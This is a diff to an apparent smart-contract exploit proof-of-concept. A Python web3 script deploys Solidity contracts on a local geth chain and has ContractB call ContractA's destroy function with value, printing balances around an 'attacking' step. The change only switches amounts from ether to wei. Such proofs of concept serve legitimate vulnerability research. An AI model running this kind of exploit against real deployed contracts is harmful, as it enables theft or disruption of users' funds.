@@ -23,7 +23,7 @@ contract ContractB {
         ContractA contractA = ContractA(targetaddr);
         
         contractA.destroy.value(0)();
-        contractA.destroy.value(2 ether)();
+        contractA.destroy.value(2 wei)();
     }
 
     function () payable{}
@@ -46,12 +46,12 @@ def main():
     w3 = runRPC()
     Pool = w3.eth.accounts[0]
     w3.geth.personal.unlock_account(Pool, "", 99999)
-    assert w3.eth.get_balance(Pool) >= w3.toWei(10, 'ether')
-
+    print("Assume we have", w3.eth.get_balance(Pool), "Wei at first.")
+    assert w3.eth.get_balance(Pool) >= w3.toWei(1, "ether")
 
     acctC = w3.geth.personal.new_account("")
     w3.geth.personal.unlock_account(acctC, "", 99999)
-    _txr = w3.eth.sendTransaction({'from': Pool, 'to': acctC, 'value': w3.toWei(5, 'ether'), 'gas': 3000000})
+    _txr = w3.eth.sendTransaction({'from': Pool, 'to': acctC, 'value': 5, 'gas': 3000000})
     w3.eth.wait_for_transaction_receipt(_txr)
 
     res = solcx.compile_source(expAgentSol, output_values=[
@@ -69,19 +69,19 @@ def main():
     contractB = w3.eth.contract(address=acctB, abi=cmrt['abi'])
 
     print(f"=========================== initial states ================================")
-    print(f"Balance @ accoount C= {w3.fromWei(w3.eth.get_balance(acctC), 'ether')}")
-    print(f"Balance @ accoount B= {w3.fromWei(w3.eth.get_balance(acctB), 'ether')}")
-    print(f"Balance @ accoount A= {w3.fromWei(w3.eth.get_balance(acctA), 'ether')}")
+    print(f"Balance @ accoount C= {w3.eth.get_balance(acctC)}")
+    print(f"Balance @ accoount B= {w3.eth.get_balance(acctB)}")
+    print(f"Balance @ accoount A= {w3.eth.get_balance(acctA)}")
     
     print(f"attacking...\n")
-    _tx_hash1 = contractB.functions.test().transact({'from': acctC, 'value': w3.toWei(2, 'ether'), 'gas': 300000})
-    _tx_hash2 = w3.eth.sendTransaction({'from': acctC, 'to': acctA, 'value': w3.toWei(1, 'ether'), 'gas': 300000})
+    _tx_hash1 = contractB.functions.test().transact({'from': acctC, 'value': 2, 'gas': 300000})
+    _tx_hash2 = w3.eth.sendTransaction({'from': acctC, 'to': acctA, 'value': 1, 'gas': 300000})
     
     assert w3.eth.wait_for_transaction_receipt(_tx_hash1)["status"] == 1
     assert w3.eth.wait_for_transaction_receipt(_tx_hash2)["status"] == 1
 
-    print(f"Balance @ accoount C= {w3.fromWei(w3.eth.get_balance(acctC), 'ether')}")
-    print(f"Balance @ accoount B= {w3.fromWei(w3.eth.get_balance(acctB), 'ether')}")
-    print(f"Balance @ accoount A= {w3.fromWei(w3.eth.get_balance(acctA), 'ether')}")
+    print(f"Balance @ accoount C= {w3.eth.get_balance(acctC)}")
+    print(f"Balance @ accoount B= {w3.eth.get_balance(acctB)}")
+    print(f"Balance @ accoount A= {w3.eth.get_balance(acctA)}")
 
 main()
